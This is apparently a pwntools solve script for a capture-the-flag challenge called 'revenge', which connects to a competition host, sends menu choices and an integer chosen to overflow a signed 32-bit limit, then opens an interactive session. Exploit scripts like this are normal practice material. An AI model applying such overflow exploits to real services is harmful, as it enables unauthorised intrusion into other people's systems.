import time
from pwn import *
conn = remote('chals.whitehacks.ctf.sg',20201)
#conn = process('./revenge')

# Display Stuff
conn.send("\n")
print(conn.recvuntil(":"))
conn.send("2\n1336\n")

#
print(conn.recv())
print()
conn.send("1\n"+str(2147483647-31337)+"\n")
#time.sleep(0.001)

conn.send("3\n")
print(conn.recv())
conn.interactive()
